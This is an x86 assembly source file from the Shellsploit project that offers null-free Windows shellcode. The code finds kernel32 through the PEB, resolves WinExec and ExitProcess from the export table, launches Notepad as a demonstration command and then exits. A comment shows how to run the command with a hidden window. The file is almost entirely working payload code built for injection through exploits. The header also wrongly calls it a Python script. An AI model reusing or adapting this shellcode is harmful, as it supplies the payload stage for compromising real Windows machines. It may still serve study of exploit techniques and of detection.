#All Windows Null-Free WinExec Shellcode

"""
#Coded by B3mB4m
#Concat : b3mb4m@tuta.io
#Home   : b3mb4m.blogspot.com
#10.12.2015
Tested on : 
	Windows XP/SP3 x86
	Windows 7 Ultimate x64	
	Windows 8.1 Pro Build 9600 x64
	Windows 10 Home x64
-This shellcode NOT using GetProcAddress function-
-With this python script you can create ur own shellcode-
-This script belongs to shellsploit project-
-https://github.com/b3mb4m/Shellsploit-
"""

SECTION .text
	global _start

_start:
	winexec:
		xor ecx,ecx
		mov ecx,0x456e6957
		jmp short second

	exitstart:
		xor ecx,ecx
		jmp short second

	second:
		xor eax,eax
		xor ebx,ebx
		xor edx,edx
		xor edi,edi
		xor esi,esi


		;Find Kernel32 Base
		mov edi, [fs:ebx+0x30]
		mov edi, [edi+0x0c]
		mov edi, [edi+0x1c]

		module_loop:
			mov eax, [edi+0x08]
			mov esi, [edi+0x20]
			mov edi, [edi]
			cmp byte [esi+12], '3'
		jne module_loop

		; Kernel32 PE Header
		mov edi, eax
		add edi, [eax+0x3c]

		; Kernel32 Export Directory Table
		mov edx, [edi+0x78]
		add edx, eax

		; Kernel32 Name Pointers
		mov edi, [edx+0x20]
		add edi, eax

		; Find WinExec
		mov ebp, ebx
	
		cmp ecx,0x456e6957
		jne exit


function:
	name_loop:
		mov esi, [edi+ebp*4]
		add esi, eax
		inc ebp
		cmp dword [esi],ecx ;WinE
	jne name_loop


	; WinExec Ordinal
	mov edi, [edx+0x24]
	add edi, eax
	mov bp, [edi+ebp*2]

	; WinExec Address
	mov edi, [edx+0x1C]
	add edi, eax
	mov edi, [edi+(ebp-1)*4] ;subtract ordinal base
	add edi, eax


	;cmp ecx,

	; Zero Memory
	mov ecx, ebx
	mov cl, 0xFF
		
	zero_loop:
		push ebx
	loop zero_loop


	push 0x20646170
	push 0x65746F6E

	mov edx, esp

	; call WinExec
	inc ecx  ; ecx=1 show window, 0=hidden (simply comment out for that)
	push ecx ; window mode
	push edx ; command
	call edi

	call exitstart


exit:
	name_loop2:
		mov esi, [edi+ebp*4]
		add esi, eax
		inc ebp
		cmp dword [esi],0x74697845
		jne name_loop2
		cmp dword [esi+4],0x636f7250 
		jne name_loop2


	mov edi, [edx+0x24]
	add edi, eax
	mov bp, [edi+ebp*2]

	mov edi, [edx+0x1C]
	add edi, eax
	mov edi, [edi+(ebp-1)*4] ;subtract ordinal base
	add edi, eax

	;mov ecx, ebx
	;mov cl, 0xFF
		
	;zero_loop2:
		;push ebx
	;loop zero_loop2



	xor  ecx,ecx 
	push ecx ;exit(0)
	call edi
